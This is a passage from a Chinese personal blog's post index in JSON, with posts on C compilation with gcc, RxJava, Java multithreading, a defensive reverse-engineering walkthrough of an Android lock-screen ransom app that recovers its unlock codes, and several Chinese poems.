这样一段代码通过编译器进行如下操作后来得到可执行文件 下面详细说明下每个步骤 预处理根据#开头的命令，将头文件命令行代码插入代码 可以用gcc -E hello.c -o hello.i 来只完成预处理 打开hello.i 可以发现代码前边多处500多行代码 这个可以在本机目录下找到stdio.h这个文件 这就是预处理的整个过程 编译将hello.i编译成汇编语言，这个过程之后程序会更接近机器语言 这里解释下什么是机器语言，什么是高级语言 我们定义 00100 1 0的含义为1 + 0 即 00100 为加号 1 为被加数 0 为加数 这样写偏向于底层，在程序员看来是非常不直接的，不方便的。（这种二进制代码也被称为硬编码） 那我们再次规定，我们用add 1 0 来表示1 + 0，这样子容易理解多了， （类似于早期这种比较简单语言称为汇编语言，这样的代码需要巨大的代码量来完成一些简单的逻辑） 人们使用汇编语言将常用的一些逻辑二次封装成为比较人性化的代码 再把 add 1 0 二次封装，为 1 + 0 这样，就很方便使用和理解 （这种代码就被称为高级语言，这种语言更符合人类的使用习惯） 上面这串代码从下往上的过程，就被称为代码的编译，处理它们的软件被称为编译器 使用 gcc -S hello.i -o hello.s可以将预处理后的文件编译为汇编语言的文件 汇编将hello.s 打包成可重定位目标程序 hello.o 这一步已经将机器语言变成了二进制文件，用文本文件打开后会看到乱码 但仍然可以用二进制文本编辑器查看 链接我们上边说过，早期人们将一些常用的逻辑打包， 一些常用逻辑包放在在标准库，使大家不需要每个函数都存放在代码里 就比如我们使用的printf 函数在标准库中的printf.o文件 在链接时，将hello.o 和printf.o两个文件打包成可执行文件 使用 gcc hello.o -o hello 就可以链接需要的文件得到可执行文件","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"Rxjava学习笔记","slug":"技/Rxjava","date":"2021-07-11T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f44be05a.html","link":"","permalink":"http://example.com/article/f44be05a.html","excerpt":"","text":"RxJava是基于事件流，进行异步操作的库，类似于android中的AsyncTask，Handler的作用 特点在于逻辑简洁实现优雅使用简单。 Rxjava的逻辑流程顾客到饭店吃饭，找服务员点菜，服务员到厨房下单，后厨根据顺序烹调出对应的菜式，然后按顺序一一送给顾客 在整个逻辑中有四个角色 顾客：被观察者（observable） 厨房：观察者（Observer） 服务员：订阅（SubScribe） 菜式：事件（Event） 被观察者产生事件，观察者接收事件并且给出响应动作 订阅连接观察者和被观察者 事件是被观察者 &amp; 观察者 沟通的载体 实现步骤引入依赖 implementation &quot;io.reactivex.rxjava3:rxjava:3.x.y&quot; （这里xy指的是版本号，尽量去github自己看，我这里用的是3.0.13） 创建方式，还是一般创建方式 我这里使用的是rxjava3，直接写在了mainactivity中 //正常创建形式 //创建被观察者 Observable.create(new ObservableOnSubscribe&lt;String&gt;() &#123; @Override public void subscribe(@NonNull ObservableEmitter&lt;String&gt; emitter) throws Throwable &#123; try &#123; //在这里传递参数 emitter.onNext(&quot;这是第一个参数&quot;); emitter.onComplete(); &#125;catch (Exception e)&#123; //在这里传递异常 emitter.onError(e); &#125; &#125; //这里相当于直接创建观察者并订阅 &#125;).subscribe(new Observer&lt;String&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; Log.d(TAG,&quot;调用subscribe&quot;); &#125; @Override public void onNext(@NonNull String s) &#123; Log.d(TAG,s); &#125; @Override public void onError(@NonNull Throwable e) &#123; Log.d(TAG,&quot;错误被调用&quot;); &#125; @Override public void onComplete() &#123; Log.d(TAG,&quot;onComplete被调用&quot;); &#125; &#125;); //just方法直接传递数据 Observable.just(&quot;测试参数&quot;).subscribe(new Observer&lt;String&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; Log.d(TAG,&quot;调用subscribe&quot;); &#125; @Override public void onNext(@NonNull String s) &#123; Log.d(TAG,s); &#125; @Override public void onError(@NonNull Throwable e) &#123; Log.d(TAG,&quot;错误被调用&quot;); &#125; @Override public void onComplete() &#123; Log.d(TAG,&quot;onComplete被调用&quot;); &#125; &#125;); rxjava可以传递数组 不过rxjava3抛弃了from改用了具体的from类型 int[] intArray = &#123;1,2,3,4&#125;; Observable.fromArray(intArray).subscribe(new Observer&lt;int[]&gt;() &#123; @Override public void onSubscribe(@NonNull Disposable d) &#123; &#125; @Override public void onNext(int @NonNull [] ints) &#123; for(int a : ints)&#123; Log.d(TAG, a+&quot;&quot;); &#125; &#125; @Override public void onError(@NonNull Throwable e) &#123; &#125; @Override public void onComplete() &#123; &#125; &#125;); 这里具体使用见文档，不多做赘述","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"老去的尼尼卡 --英雄的迟暮","slug":"诗/TheOldninika","date":"2021-06-02T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/f8245e93.html","link":"","permalink":"http://example.com/article/f8245e93.html","excerpt":"","text":"老去的尼尼卡我们的尼尼卡老去了， 他伟岸的肩膀不再挺拔…… 这位满头白发的老人 真的曾经拥有钢铁一般的力量？ 啊，母亲啊！ 到底有多少次他挥舞着“土狼”镰刀， 袒胸露背， 在麦田的尽头突然大声地咆哮。 他肯定搬移过大山 把它们并排而列， 他那滴汗的脸上 喷射着火焰和浓烟。 可他现在连膝盖都动不了， 岁月割去了它们。 他只能躺下， 或者做梦， 或者告诉他子孙的子孙 他曾经的过往。 他偶尔会听见 附近麦田传来的歌声， 他那曾经坚硬的心开始愉悦地跳动。 他颤抖地走出了门。 他拄着拐杖往前走了几步。 当他看到年轻的小伙， 他安慰地笑了起来。 ——索塞罗","categories":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}],"tags":[],"keywords":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}]},{"title":"一个安卓锁机软件的逆向分析","slug":"逆/reRootLock","date":"2021-05-27T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/e48e684a.html","link":"","permalink":"http://example.com/article/e48e684a.html","excerpt":"","text":"前两天在吾爱上看到有人求助手机被锁，顺手吧样本下载了，分析下。 样本桌面是一个百度网盘的图标 这像素一看就是假的。。。 打开后是个root锁机，这里还是提醒各位没事不要随便开root权限，这都2021年了，还有这种垃圾软件，也是服了！ 直接jeb 启动后看到这变量名是真恶心啊！！！ 发现MainActivity中只调用了一个hh 第一个页面这里发现第一个页面是第四层函数 这里主要是q()中是个文字编码，提取出来，把这两行解密下。 这里有一行解码后发现是一个网站，猜测可能是访问网站返回解码 100000005线程处跟进 本质是做了一个判断，继续跟进isINTERET() 这里发现9160，尝试下，对了 然后进入第二个页面 （还是多重锁机骗钱，可以很骚，很傻逼） 第二个页面 第二层是第五层的函数 跟进100000008 点击屏幕30次会出现两个控件 然后跟进100000009 这里try里边先做了一个字符编码，直接把m这个函数摘下来稍作修改 解码后是9，5，10 然后通过这三个数做了运算 同样吧加密摘下来 这个加密处理处v0.val$test 是界面给的序列号 这个序列号是通过取随机数然后通过m下的方法处理后的（这个软件变量方法名太恶心了，就在第五层的倒数第三行） 还是老办法，把这个函数取出来处理下 把v1，v2 的值交换下就可以了 转第二层锁 第三个页面 这个和上一个差不多做法就不细说了 把改过的函数挂出来吧（这里边函数或者变量名是修改过的，后边会把整个项目脚本放上来，可以看那个） 解出来后跳到第四个页面 第四个页面第三层函数 和上边也是差不多 继续改函数 这里要注意 粉红兔 这个实例在创建的时候传了个 fuck参数（当时找了好久，好烦呀） 搞定，下一层下一层 第五个页面第一层函数，看起来也差不多 看第四个页面，不过这里又个迷惑人的点 随机码多了一个b，解码时删掉这个解就好 总结没有什么特别奇怪的算法，都是大差不差，刚去看了下吾爱，好像有师傅提前解出来了 网站也是被挺多人留言了 分析的时候去找过那个qq群，好像还在运行，这种人就挺可恶的 拿技术做坏事，为人所不齿 脚本因为是分析的时候写的，乱得很，这里先放上来 https://gitee.com/p1piyang/backward-analysis/tree/master 累死了！！！","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"java多线程","slug":"技/javaMultithreading","date":"2020-06-25T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/11bde6ec.html","link":"","permalink":"http://example.com/article/11bde6ec.html","excerpt":"","text":"(因为是迁移过来的，好多图片都丢失了，建议自己复制代码运行看一下) 串行与并发 串行 当有多个任务需要执行时，是按照从前往后的顺序去执行的顺序就叫串行。类比的话就是一条单行道上的车辆肯定是前后顺序，不可能同时通行多辆车。 并发是让多个任务同时执行。一条马路上的两条单行车道上两辆车同时执行，这两辆车就是并发的状态。 程序的运行状态一般是串行与并发同步进行的。 进程进程是对一个程序运行是各种资源的描述（cpu，内存等），进程实现多个任务并发运行。进程资源不共享。 线程线程是进程的最小单元。如果把进程看成一座工厂，进程就是进程中的流水线。一个进程中有多个线程，且一个进程中有多个线程。线程资源共享（临界资源）。 并发是怎么做到的计算机给某个进程（或线程）分配固定的cpu时间，让cpu快速的在不同进程（或线程）中快速切换，来造成同时运行的假象。cpu的运行速度是非常快的，人反应不过来，这才导致的并发假象。 （是假象） 线程的生命周期从被实例化完成到被销毁。线程的状态: 新生态 New ：一个线程被实例化完成，没有做任何操作。 就绪态 Ready：一个线程已经被开启，已经开始争抢cpu时间片（某段时间去运行这个线程）。 运行态 Run： 一个线程抢到了cpu时间片，已经开始执行现成的逻辑。 阻塞态 Interrupt：正在运行的过程中受到某些操作的影响，放弃了已经获取到的cpu时间片，并且不再参与cpu时间片的争抢，处于挂起状态。（scanf sleep join等） 死亡态 Dead：一个线程对象被销毁。 创建实例化线程 继承Thread类，自定义线程类 package com.p1.theard; public class ThreadCreate1 &#123; public static void main(String[] args) &#123; //实例化子线程 MyThread myThread = new MyThread(); //通过start方法开启线程，如果直接调用run方法他会把线程当作普通类来运行 myThread.start(); //在线程之后打印句话来感受下线程 System.out.println(&quot;主线程逻辑&quot;); &#125; &#125; //继承Thread并重写run方法 class MyThread extends Thread&#123; @Override public void run() &#123; for (int i=0; i&lt;10; i++)&#123; System.out.println(&quot;子线程逻辑&quot;+i); &#125; &#125; &#125; 执行后会发现先执行的主线程逻辑这句话，然后才是子线程逻辑。 通过Runnable接口 package com.p1.theard; public class ThreadCreate2 &#123; public static void main(String[] args) &#123; Runnable r = new Runnable() &#123; @Override public void run() &#123; for (int i = 0; i &lt; 9; i++) &#123; System.out.println(&quot;子线程逻辑1:&quot;+i); &#125; &#125; &#125;; //lambda表达式 Runnable r1 = () -&gt; &#123; for (int i = 0; i &lt; 9; i++) &#123; System.out.println(&quot;子线程逻辑2:&quot;+i); &#125; &#125;; //通过有参来实例化线程 Thread t1 = new Thread(r); Thread t2 = new Thread(r1); //启动 t1.start(); System.out.println(&quot;主线程逻辑1&quot;); t2.start(); System.out.println(&quot;主线程逻辑2&quot;); &#125; &#125; 通过多次运行能发现他们每次运行的每个线程运行时间都是不一样的，更好的感受下争抢cpu时间片这个概念。 线程的命名 实例化对象同时通过构造方法命名 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(&quot;custom1&quot;); System.out.println(t1.getName()); &#125; &#125; Runnable接口创建同时命名 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; Thread t1 = new Thread(() -&gt; &#123;&#125;,&quot;custom2&quot;); System.out.println(t1.getName()); &#125; &#125; 自定义线程类,实例化同时进行名称赋值 package com.p1.theard; public class Thread_name &#123; public static void main(String[] args) &#123; MyThread2 myThread2 = new MyThread2(&quot;custom3&quot;); System.out.println(myThread2.getName()); &#125; &#125; class MyThread2 extends Thread&#123; public MyThread2(String name)&#123; this.setName(name); &#125; &#125; 线程的休眠Thread.sleep() 以毫秒为单位 package com.p1.theard; public class Thread_sleep &#123; public static void main(String[] args) &#123; MyThread3 myThread3 = new MyThread3(); myThread3.start(); &#125; &#125; class MyThread3 extends Thread&#123; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.println(i); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; 线程的优先级设置线程的优先级只是去修改这个线程抢到cpu时间片的概率。不代表优先级高的一定能抢到cpu时间片。优先级的设置是一个(0,10]的整数，默认是5。设置优先级必须要放到start之前。 package com.p1.theard; public class Thread_first &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt; &#123; for (int i = 0; i &lt; 100; i++) &#123; System.out.println(Thread.currentThread().getName()+&quot;&quot;+i); &#125; &#125;; Thread t1 = new Thread(r1,&quot;Thread-1:&quot;); Thread t2 = new Thread(r1,&quot;Thread-2:&quot;); t1.setPriority(1); t2.setPriority(10); t1.start(); t2.start(); &#125; &#125; 线程的礼让让当前运行状态的线程释放自己的cpu资源，由运行状态回到就绪状态，然后重新抢cpu时间片。 package com.p1.theard; public class Thread_yield &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.println(Thread.currentThread().getName()+&quot;&quot;+i); if (i == 3)&#123; Thread.yield(); &#125; &#125; &#125;; Thread t1 = new Thread(r1,&quot;thread-1:&quot;); Thread t2 = new Thread(r1,&quot;thread-2:&quot;); t1.start(); t2.start(); &#125; &#125; 线程的临界资源问题线程中资源共享例如一个景点的四个售票员，他们卖的票都是从一个票库里拿出来的，这个票库里的票就叫临界资源。 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; System.out.println(Thread.currentThread().getName()+&quot;卖出1张票，剩余&quot;+ --TicketClent.restCount); &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 按照正常逻辑，最后一条输出应该是Jon卖出1张票，剩余0，但事实并不是这样。 System.out.println(Thread.currentThread().getName()+&quot;卖出1张票，剩余&quot;+ --TicketClent.restCount); 这行代码的运行是先去将TicketClent类中的restCount变量减1 先是由thread-1抢到了cpu时间片，thread-1刚去将restCount减一，还没来得及打印或者刚刚打印，就被thread-2抢走了cpu时间片（剩余99张） thread-2刚执行完减一操作，没有来得及打印又被thread-4抢去了cpu时间片（剩余98张）（第97张在比较靠下） thread-4也是减一完之后没有来得及打印，被thread-3抢去cpu时间片（剩余97张） thread-3减一之后没有打印就被thread-1抢去cpu时间片（剩余96） thread-1得到cpu时间片之后完成了减一打印一系列操作，进行了两次循环之后被thread-2抢去了cpu时间片 thread-2得到cpu时间片之后先把没有来得及打印的东西打印出来，然后正常执行减一打印操作，一路高歌猛进。 以此类推就能明白整个逻辑（ps：thread-3，thread-4真水，前边就个抢到一次） 解决临界资源问题（线程锁）临界资源问题的本质是多个线程同时访问同一个资源解决方法：在某个线程访问临界资源时，在资源外边加一把锁，其他资源发现锁之后就等待，等到解锁之后再去操作资源。 线程锁： 多个同时访问临界资源的线程看到的锁需要时同一把锁 同步代码段（synchroized）package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; //对象锁，在括号中写对象 //类锁： 在括号中写类 synchronized (&quot;&quot;)&#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 运行之后我们会发现出现负数原因是当restCount为1时，其他while循环成立，线程进去之后发现锁，就会在while里边锁外边等待正在执行的线程结束释放资源解锁，解锁之后刚运行完的线程发现不满足循环条件就不会再去争抢，而在循环里边的线程不回去管restCount的值继续去执行。 解决方法：在锁中加一个判断，判断restCount是否大于0再去执行打印即可 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; synchronized (&quot;&quot;)&#123; if (TicketClent.restCount&gt;0) &#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 同步方法 （使用关键字synchronized修饰的方法）静态方法：同步锁就是类锁 当前类.class非静态方法：this 将买票（执行逻辑）放到一个单独的方法里边，并且用synchronized修饰 package com.p1.theard; public class ScorceFilct &#123; public static void main(String[] args) &#123; //实例化四个线程来模拟四个售票员 Runnable r = () -&gt; &#123; while (TicketClent.restCount &gt; 0)&#123; soidCket(); &#125; &#125;; Thread t1 = new Thread(r,&quot;thread-1&quot;); Thread t2 = new Thread(r,&quot;thread-2&quot;); Thread t3 = new Thread(r,&quot;thread-3&quot;); Thread t4 = new Thread(r,&quot;thread-4&quot;); t1.start(); t2.start(); t3.start(); t4.start(); &#125; public synchronized static void soidCket()&#123; if (TicketClent.restCount&gt;0) &#123; System.out.println(Thread.currentThread().getName() + &quot;卖出1张票，剩余&quot; + --TicketClent.restCount); &#125; &#125; &#125; //票库 class TicketClent&#123; //票库中的100张票 public static int restCount = 100; &#125; 显式（ReentrcntLock）创建ReentecntLock对象 在代码段前后用lock（）方法（代码段前）unlock（）方法（代码段后） 死锁多个线程彼此持有对方需要的锁，而不去释放自己的锁 package com.p1.theard; public class DeadLock &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r1线程持有a锁，等待b锁&quot;); synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r1线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Runnable r2 = () -&gt;&#123; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r2线程持有b锁，等待a锁&quot;); synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r2线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Thread t1 = new Thread(r1); Thread t2 = new Thread(r2); t1.start(); t2.start(); &#125; &#125; 没有任何一个线程能去同时持有a锁和b锁并且程序没有结束，线程都在等待对方解锁我们在程序中尽量要去避免死锁 解死锁wait：等待，Object类中的一个方法，让当前的线程，并且让出cpu资源，并且让线程进入等待队列。 notify： 通知，Object类中的一个方法，唤醒等待队列中的一个线程，使这个线程进入锁池。 notifyAll：通知，Object类中的一个方法，唤醒等待队列的所有线程，使所以线程进入锁池。 package com.p1.theard; public class DeadLock &#123; public static void main(String[] args) &#123; Runnable r1 = () -&gt;&#123; synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r1线程持有a锁，等待b锁&quot;); try &#123; //r1释放掉A线程，并且r1进入等待队列，等待唤醒 &quot;A&quot;.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r1线程同时持有a，b锁&quot;); &#125; &#125; &#125;; Runnable r2 = () -&gt;&#123; synchronized (&quot;B&quot;)&#123; System.out.println(&quot;r2线程持有b锁，等待a锁&quot;); synchronized (&quot;A&quot;)&#123; System.out.println(&quot;r2线程同时持有a，b锁 &quot;); &#125; &#125; &#125;; Thread t1 = new Thread(r1); Thread t2 = new Thread(r2); t1.start(); t2.start(); &#125; &#125; 使用wait之后发现r2抢到了a锁和b锁，释放了b锁但r1没有继续进行，而此时程序也没有正常退出。是因为r1线程进入了等待队列，还没有被唤醒。在r2完成之后去唤醒r1就能使r1进入b锁","categories":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}],"tags":[],"keywords":[{"name":"一些杂七杂八的技术","slug":"一些杂七杂八的技术","permalink":"http://example.com/categories/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E6%8A%80%E6%9C%AF/"}]},{"title":"致橡树","slug":"诗/扬州慢","date":"2018-12-18T16:00:00.000Z","updated":"2023-12-21T06:41:50.753Z","comments":true,"path":"article/26be181c.html","link":"","permalink":"http://example.com/article/26be181c.html","excerpt":"","text":"《扬州慢·淮左名都》- 姜夔淳熙丙申至日，予过维扬。夜雪初霁，荠麦弥望。入其城，则四顾萧条，寒水自碧，暮色渐起，戍角悲吟。予怀怆然，感慨今昔，因自度此曲。千岩老人以为有《黍离》之悲也。 淮左名都，竹西佳处，解鞍少驻初程。过春风十里，尽荠麦青青。自胡马窥江去后，废池乔木，犹厌言兵。渐黄昏，清角吹寒，都在空城。 杜郎俊赏，算而今重到须惊。纵豆蔻词工，青楼梦好，难赋深情。二十四桥仍在，波心荡，冷月无声。念桥边红药，年年知为谁生？","categories":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}],"tags":[],"keywords":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}]},{"title":"致橡树","slug":"诗/致橡树","date":"2018-12-18T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/26be181c.html","link":"","permalink":"http://example.com/article/26be181c.html","excerpt":"","text":"致橡树​ 舒婷 我如果爱你——绝不像攀援的凌霄花，借你的高枝炫耀自己；我如果爱你——绝不学痴情的鸟儿，为绿荫重复单调的歌曲；也不止像泉源，常年送来清凉的慰藉；也不止像险峰，增加你的高度，衬托你的威仪。甚至日光，甚至春雨。 不，这些都还不够！我必须是你近旁的一株木棉，作为树的形象和你站在一起。根，紧握在地下；叶，相触在云里。每一阵风过，我们都互相致意，但没有人，听懂我们的言语。你有你的铜枝铁干，像刀，像剑，也像戟；我有我红硕的花朵，像沉重的叹息，又像英勇的火炬。 我们分担寒潮、风雷、霹雳；我们共享雾霭、流岚、虹霓。仿佛永远分离，却又终身相依。这才是伟大的爱情，坚贞就在这里：爱——不仅爱你伟岸的身躯，也爱你坚持的位置，足下的土地。","categories":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}],"tags":[],"keywords":[{"name":"诗","slug":"诗","permalink":"http://example.com/categories/%E8%AF%97/"}]}]}